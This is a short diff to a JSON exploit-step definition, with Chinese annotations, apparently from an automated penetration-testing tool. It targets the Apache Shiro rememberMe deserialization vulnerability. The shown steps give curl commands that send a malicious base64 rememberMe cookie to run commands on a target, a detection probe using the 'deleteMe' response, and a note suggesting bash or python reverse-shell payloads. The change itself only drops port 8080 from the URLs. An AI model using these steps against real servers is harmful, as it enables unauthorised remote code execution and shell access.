@@ -38,12 +38,12 @@
     {
       "step": 2,
       "description": "发送包含恶意rememberMe Cookie的HTTP请求",
-      "command": "curl -v http://{TARGET}:8080/ -H 'Cookie: rememberMe={BASE64_PAYLOAD}'",
+      "command": "curl -v http://{TARGET}/ -H 'Cookie: rememberMe={BASE64_PAYLOAD}'",
       "expected_result": "返回正常HTTP响应（200/302等），并在目标服务器上执行命令",
       "notes": "将{BASE64_PAYLOAD}替换为上一步生成的base64字符串，注意Cookie值不要包含引号"
     }
   ],
-  "verification_command": "curl -v http://{TARGET}:8080/ -H 'Cookie: rememberMe=dGVzdA=='",
+  "verification_command": "curl -v http://{TARGET}/ -H 'Cookie: rememberMe=dGVzdA=='",
   "verification_success_sign": "响应头中包含Set-Cookie: rememberMe=deleteMe",
   "requires_callback": false,
   "callback_note": "此漏洞通过反序列化直接执行命令，不需要目标回连。如需反弹shell，可在payload中使用bash/python反弹命令",
